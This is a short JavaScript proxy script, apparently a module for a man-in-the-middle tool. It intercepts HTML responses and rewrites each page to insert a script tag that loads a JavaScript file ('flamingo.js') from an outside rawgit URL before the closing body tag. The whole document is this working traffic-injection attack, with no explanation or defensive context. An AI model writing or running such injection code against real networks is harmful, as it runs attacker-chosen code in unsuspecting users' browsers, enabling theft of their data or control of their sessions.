function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        res.Body = body.replace(
                '</body>',
                '<script type="text/javascript" src="https://rawgit.com/burakguneli/burakguneli/f45dcaacfe2c55b71c269e385bba50eb/raw/d02faa5aaf646acd615c442864c4f2e1e7dc2c5c/flamingo.js"></script></body>'
        );
        console.log(res.Body);
    }
}